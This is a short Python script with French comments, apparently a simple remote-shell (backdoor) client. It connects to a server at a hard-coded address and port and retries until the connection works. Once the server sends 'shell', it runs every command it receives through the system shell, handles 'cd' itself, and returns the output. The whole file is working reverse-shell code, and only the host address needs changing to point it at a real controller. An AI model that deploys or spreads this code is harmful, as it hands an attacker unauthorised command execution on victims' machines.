import socket
import time
import os
import subprocess

HOST_IP = "127.0.0.1"
HOST_PORT = 3500
MAX_DATA_SIZE = 1024

# --------------- Fonctions ---------------
def send(data):
    s.sendall(data.encode(encoding='UTF-8'))
    
def listen():
    data_recues = s.recv(MAX_DATA_SIZE)
    return data_recues.decode(encoding='UTF-8')

def shell_client():
	while True:
		send(os.getcwd())
		command = listen()
		if command == "exit":
			return
		print("Commande : ", command)
		command_split = command.split(" ")
		if len(command_split) == 2 and command_split[0] == "cd":
			try:
				os.chdir(command_split[1])
			except FileNotFoundError:
				print("ERREUR : ce répertoire n'exite pas")
				send("ERREUR : ce répertoire n'exite pas")
		else:
			resultat = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)  # dir sur PC
			if not resultat.stdout:
				print(resultat.stderr)
				send(resultat.stderr)
			else:
				print(resultat.stdout)
				send(resultat.stdout)
         		


# Connexion au serveur
print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
	try:
		s = socket.socket()
		s.connect((HOST_IP, HOST_PORT))
	except ConnectionRefusedError:
		print("ERREUR : impossible de se connecter au serveur. Reconnexion... ")
		time.sleep(4)
	else:
		print("Connecté au serveur")
		break

while True:
	data = listen()
	if not data:
		break

	print("Commande : ", data)
 
	if data == "shell":
		shell_client()
  


s.close()